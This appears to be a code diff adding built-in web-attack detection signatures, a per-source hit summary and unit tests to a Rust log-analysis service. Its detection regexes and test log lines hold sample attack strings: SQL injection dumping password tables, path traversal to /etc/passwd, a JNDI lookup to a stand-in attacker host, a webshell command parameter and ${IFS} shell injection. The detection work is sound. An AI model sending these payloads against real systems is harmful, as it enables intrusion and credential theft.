@@ -1,7 +1,7 @@
 //! Target-bound log collection, threat summarization, and safely quoted queries.
 
 use std::{
-    collections::{BTreeSet, HashMap},
+    collections::{BTreeMap, BTreeSet, HashMap},
     sync::Arc,
     time::Duration,
 };
@@ -229,6 +229,10 @@ pub struct LogMatchRule {
     pub name: String,
     pub pattern: String,
     pub severity: LogRuleSeverity,
+    /// Fixed, core-owned signature. Built-ins are never stored, listed for
+    /// editing, or removable; they are merged in at match time only.
+    #[serde(default)]
+    pub builtin: bool,
 }
 
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -236,6 +240,83 @@ pub struct CreateLogMatchRule {
     pub name: String,
     pub pattern: String,
     pub severity: LogRuleSeverity,
+}
+
+/// How often one apparent source address hit built-in attack signatures,
+/// together with which signatures fired. A lead list, not a verdict: the
+/// address comes from the line itself and may be spoofed or proxied.
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
+pub struct LogRuleSourceStat {
+    pub source: String,
+    pub hits: usize,
+    pub rules: Vec<String>,
+}
+
+/// Built-in web-attack signatures. They are core-owned fixed patterns applied
+/// to every match call; the ids are stable so a hit names the same rule every
+/// run. Severity stays one notch below certainty: a signature on a request
+/// line is a lead to review, not proof of compromise.
+pub fn builtin_log_rules() -> Vec<LogMatchRule> {
+    use LogRuleSeverity::{Critical, High};
+    [
+        (
+            "log-rule-3f7c9a2e-1b6d-4e8a-9c5d-2a1e0f6b8d4c",
+            "union-select-sqli",
+            r"union(\s|%20|\+|/\*\*/)+(all(\s|%20|\+)+)?select",
+            Critical,
+        ),
+        (
+            "log-rule-8a2d4f1c-6e5b-4a9d-b3c7-1f0e9d8a7b6c",
+            "path-traversal",
+            r"\.\.[\\/]|%2e%2e",
+            High,
+        ),
+        (
+            "log-rule-5e1b9c3a-8d2f-4a6e-b7c9-0f1e2d3a4b5c",
+            "jndi-injection",
+            r"\$\{jndi:",
+            Critical,
+        ),
+        (
+            "log-rule-2c6e8a4b-9f1d-4b7a-c5e3-3d9b0a1c2e4f",
+            "thinkphp-exploit-path",
+            r"s=index/think|invokefunction|s=captcha",
+            High,
+        ),
+        (
+            "log-rule-7d3a5e9c-2b8f-4c1d-a6e0-4f2b8c0d1a3e",
+            "webshell-param-access",
+            r"\.(php[0-9]?|phtml|phar|jspx?|asp|aspx|asa|cer|ashx)\?[^ ]{0,200}(eval|assert|system|exec|passthru|shell_exec|cmd|whoami)=",
+            High,
+        ),
+        (
+            "log-rule-9b4f6a1d-3c7e-4d5b-b8f2-6a0c1e3d5f7a",
+            "scanner-tool-banner",
+            r"(sqlmap|acunetix|nikto|masscan|nessus|wpscan|dirbuster|gobuster)[/:\s]",
+            High,
+        ),
+        (
+            "log-rule-1e5c7b3f-4a9d-4e2c-c8b6-7d0f2a4b6e8c",
+            "ifs-and-devtcp-shell",
+            r"\$\{IFS\}|/dev/tcp/",
+            Critical,
+        ),
+    ]
+    .into_iter()
+    .map(|(id, name, pattern, severity)| LogMatchRule {
+        id: id.to_owned(),
+        name: name.to_owned(),
+        pattern: pattern.to_owned(),
+        severity,
+        builtin: true,
+    })
+    .collect()
+}
+
+/// Every rule a match must consider: the stored rules plus the built-in
+/// signatures. Stored rules keep their order so a user rule still wins a tie.
+pub fn rules_for_matching(stored: &[LogMatchRule]) -> Vec<LogMatchRule> {
+    stored.iter().cloned().chain(builtin_log_rules()).collect()
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
@@ -404,6 +485,7 @@ impl LogAnalysisService {
             name: input.name.trim().to_owned(),
             pattern: input.pattern,
             severity: input.severity,
+            builtin: false,
         };
         document.rules.push(rule.clone());
         self.store.write(StoreFile::LogRules, &document)?;
@@ -415,7 +497,10 @@ impl LogAnalysisService {
         rules: &[LogMatchRule],
         entries: &[LogEntry],
     ) -> CoreResult<Vec<Option<LogMatchRule>>> {
-        if rules.len() > MAX_LOG_RULES || entries.len() > MAX_PAGE_SIZE {
+        if rules.iter().filter(|rule| !rule.builtin).count() > MAX_LOG_RULES
+            || rules.len() > MAX_LOG_RULES + builtin_log_rules().len()
+            || entries.len() > MAX_PAGE_SIZE
+        {
             return Err(CoreError::validation(
                 "log rule matching",
                 "rules or entries exceed the bounded page limits",
@@ -438,6 +523,40 @@ impl LogAnalysisService {
                     .map(|(rule, _)| (*rule).clone())
             })
             .collect())
+    }
+
+    /// Which source addresses produced the most built-in-signature hits in
+    /// this entry window, capped at the top 16. Entries whose apparent source
+    /// cannot be read (no address, loopback, unspecified) do not count — a
+    /// missing statistic never implies a clean window.
+    pub fn summarize_builtin_sources(
+        &self,
+        entries: &[LogEntry],
+    ) -> CoreResult<Vec<LogRuleSourceStat>> {
+        let matched = self.match_rules(&builtin_log_rules(), entries)?;
+        let mut by_source: BTreeMap<String, (usize, Vec<String>)> = BTreeMap::new();
+        for (entry, rule) in entries.iter().zip(matched) {
+            let Some(rule) = rule else { continue };
+            let Some(source) = extract_ip(&entry.raw) else {
+                continue;
+            };
+            let stat = by_source.entry(source).or_default();
+            stat.0 = stat.0.saturating_add(1);
+            if stat.1.len() < 8 && !stat.1.contains(&rule.name) {
+                stat.1.push(rule.name);
+            }
+        }
+        let mut stats: Vec<LogRuleSourceStat> = by_source
+            .into_iter()
+            .map(|(source, (hits, rules))| LogRuleSourceStat {
+                source,
+                hits,
+                rules,
+            })
+            .collect();
+        stats.sort_by_key(|stat| std::cmp::Reverse(stat.hits));
+        stats.truncate(16);
+        Ok(stats)
     }
 
     pub fn plan_remove_rule(&self, rule_id: &str) -> CoreResult<LogRuleRemovalPlan> {
@@ -1980,6 +2099,201 @@ mod tests {
         assert!(error.to_string().contains("changed after confirmation"));
         assert_eq!(logs.list_rules().unwrap().len(), 2);
         assert!(services.operation_journal().entries().unwrap().is_empty());
+    }
+
+    fn raw_entries(lines: &[&str]) -> Vec<LogEntry> {
+        lines
+            .iter()
+            .map(|line| LogEntry {
+                timestamp: String::new(),
+                level: String::new(),
+                service: String::new(),
+                message: String::new(),
+                raw: (*line).to_owned(),
+                highlighted: false,
+                source: None,
+            })
+            .collect()
+    }
+
+    #[test]
+    fn builtin_signatures_match_each_web_attack_family() {
+        let cases = [
+            (
+                "union-select-sqli",
+                r#"10.0.0.8 - - [10/Jan/2026:00:00:01 +0000] "GET /a?id=1%20union%20select%20user,password%20from%20mysql.user HTTP/1.1" 200 42"#,
+            ),
+            (
+                "path-traversal",
+                r#"10.0.0.9 - - [10/Jan/2026:00:00:02 +0000] "GET /static/../../etc/passwd HTTP/1.1" 400 11"#,
+            ),
+            (
+                "jndi-injection",
+                r#"10.0.0.10 - - [10/Jan/2026:00:00:03 +0000] "GET / HTTP/1.1" 200 1 "-" "${jndi:ldap://evil.example/x}""#,
+            ),
+            (
+                "thinkphp-exploit-path",
+                r#"10.0.0.11 - - [10/Jan/2026:00:00:04 +0000] "GET /index.php?s=index/think\app/invokefunction&function=call_user_func_array HTTP/1.1" 200 7"#,
+            ),
+            (
+                "webshell-param-access",
+                r#"10.0.0.12 - - [10/Jan/2026:00:00:05 +0000] "GET /upload/x.php?cmd=whoami HTTP/1.1" 200 9"#,
+            ),
+            (
+                "scanner-tool-banner",
+                r#"10.0.0.13 - - [10/Jan/2026:00:00:06 +0000] "GET / HTTP/1.1" 200 1 "-" "sqlmap/1.7""#,
+            ),
+            (
+                "ifs-and-devtcp-shell",
+                r#"10.0.0.14 - - [10/Jan/2026:00:00:07 +0000] "GET /cgi-bin/test.cgi?x=cat${IFS}/etc/passwd HTTP/1.1" 200 5"#,
+            ),
+        ];
+        let rules = builtin_log_rules();
+        let root = TestRoot::new();
+        let services = root.services();
+        let logs = services.log_analysis();
+        for (expected, line) in cases {
+            let matched = logs.match_rules(&rules, &raw_entries(&[line])).unwrap();
+            let rule = matched[0]
+                .as_ref()
+                .unwrap_or_else(|| panic!("{expected} did not match: {line}"));
+            assert_eq!(rule.name, expected, "wrong rule for {line}");
+            assert!(rule.builtin);
+        }
+    }
+
+    #[test]
+    fn builtin_matching_is_case_insensitive() {
+        let root = TestRoot::new();
+        let services = root.services();
+        let logs = services.log_analysis();
+        let line = r#"10.0.0.8 - - [10/Jan/2026:00:00:01 +0000] "GET /a?id=1%20UNION%20SELECT%201 HTTP/1.1" 200 1"#;
+        let matched = logs
+            .match_rules(&builtin_log_rules(), &raw_entries(&[line]))
+            .unwrap();
+        assert_eq!(matched[0].as_ref().unwrap().name, "union-select-sqli");
+    }
+
+    #[test]
+    fn builtin_summary_ranks_sources_and_records_which_signatures_fired() {
+        let lines = [
+            r#"10.0.0.8 - - [10/Jan/2026:00:00:01 +0000] "GET /a?id=1 union select 1 HTTP/1.1" 200 1"#,
+            r#"10.0.0.8 - - [10/Jan/2026:00:00:02 +0000] "GET /b/../../etc/passwd HTTP/1.1" 400 1"#,
+            r#"10.0.0.9 - - [10/Jan/2026:00:00:03 +0000] "GET /a?id=1 union select 1 HTTP/1.1" 200 1"#,
+            r#"127.0.0.1 - - [10/Jan/2026:00:00:04 +0000] "GET /a?id=1 union select 1 HTTP/1.1" 200 1"#,
+            r#"- - - [10/Jan/2026:00:00:05 +0000] "GET /a?id=1 union select 1 HTTP/1.1" 200 1"#,
+            r#"10.0.0.20 - - [10/Jan/2026:00:00:06 +0000] "GET /health HTTP/1.1" 200 1"#,
+        ];
+        let root = TestRoot::new();
+        let stats = root
+            .services()
+            .log_analysis()
+            .summarize_builtin_sources(&raw_entries(&lines))
+            .unwrap();
+        assert_eq!(stats.len(), 2, "loopback and missing sources stay out");
+        assert_eq!(stats[0].source, "10.0.0.8");
+        assert_eq!(stats[0].hits, 2);
+        assert_eq!(
+            stats[0].rules,
+            vec!["union-select-sqli".to_owned(), "path-traversal".to_owned()]
+        );
+        assert_eq!(stats[1].source, "10.0.0.9");
+        assert_eq!(stats[1].hits, 1);
+    }
+
+    #[test]
+    fn builtin_summary_keeps_only_the_top_sixteen_sources() {
+        let lines: Vec<String> = (0..20)
+            .map(|index| {
+                format!(
+                    r#"10.0.0.{} - - [10/Jan/2026:00:00:01 +0000] "GET /a?id=1 union select 1 HTTP/1.1" 200 1"#,
+                    index + 1
+                )
+            })
+            .collect();
+        let entries = raw_entries(&lines.iter().map(String::as_str).collect::<Vec<_>>());
+        let root = TestRoot::new();
+        let stats = root
+            .services()
+            .log_analysis()
+            .summarize_builtin_sources(&entries)
+            .unwrap();
+        assert_eq!(stats.len(), 16);
+        assert!(stats.iter().all(|stat| stat.hits == 1));
+    }
+
+    #[test]
+    fn stored_rules_still_match_first_and_builtins_merge_behind_them() {
+        let root = TestRoot::new();
+        let services = root.services();
+        let logs = services.log_analysis();
+        let custom = logs
+            .add_rule(CreateLogMatchRule {
+                name: "my-sqli-note".to_owned(),
+                pattern: "union".to_owned(),
+                severity: LogRuleSeverity::Low,
+            })
+            .unwrap();
+        let merged = rules_for_matching(&logs.list_rules().unwrap());
+        assert!(merged.last().unwrap().builtin);
+        let line = r#"10.0.0.8 - - "GET /a?id=1 union select 1 HTTP/1.1" 200 1"#;
+        let matched = logs.match_rules(&merged, &raw_entries(&[line])).unwrap();
+        assert_eq!(matched[0].as_ref().unwrap().id, custom.id);
+        assert!(!matched[0].as_ref().unwrap().builtin);
+        // A line only a builtin knows still resolves to the builtin.
+        let jndi = r#"10.0.0.8 - - "GET / HTTP/1.1" 200 1 "-" "${jndi:ldap://x/a}""#;
+        let matched = logs.match_rules(&merged, &raw_entries(&[jndi])).unwrap();
+        assert_eq!(matched[0].as_ref().unwrap().name, "jndi-injection");
+    }
+
+    #[test]
+    fn match_bound_counts_stored_rules_not_the_fixed_catalog() {
+        let root = TestRoot::new();
+        let services = root.services();
+        let logs = services.log_analysis();
+        let mut stored = Vec::new();
+        for index in 0..128 {
+            stored.push(LogMatchRule {
+                id: format!("log-rule-{:08x}-0000-4000-8000-000000000000", index + 1),
+                name: format!("rule-{index}"),
+                pattern: "unlikely".to_owned(),
+                severity: LogRuleSeverity::Low,
+                builtin: false,
+            });
+        }
+        let entries = raw_entries(&["noise"]);
+        // 128 stored plus the built-in catalog stays inside the bound.
+        let merged = rules_for_matching(&stored);
+        assert!(logs.match_rules(&merged, &entries).is_ok());
+        // One more stored rule is over it.
+        stored.push(LogMatchRule {
+            id: "log-rule-ffffffff-0000-4000-8000-000000000000".to_owned(),
+            name: "one-too-many".to_owned(),
+            pattern: "x".to_owned(),
+            severity: LogRuleSeverity::Low,
+            builtin: false,
+        });
+        let merged = rules_for_matching(&stored);
+        assert!(logs.match_rules(&merged, &entries).is_err());
+    }
+
+    #[test]
+    fn builtin_signatures_do_not_claim_clean_logs() {
+        let root = TestRoot::new();
+        let services = root.services();
+        let logs = services.log_analysis();
+        let lines = [
+            r#"10.0.0.8 - - [10/Jan/2026:00:00:01 +0000] "GET /index.html HTTP/1.1" 200 512"#,
+            "Aug 11 03:01:02 host sshd[1]: Accepted publickey for admin from 10.0.0.9 port 22",
+        ];
+        let matched = logs
+            .match_rules(&builtin_log_rules(), &raw_entries(&lines))
+            .unwrap();
+        assert!(matched.iter().all(|hit| hit.is_none()));
+        let stats = logs
+            .summarize_builtin_sources(&raw_entries(&lines))
+            .unwrap();
+        assert!(stats.is_empty());
     }
 
     #[test]
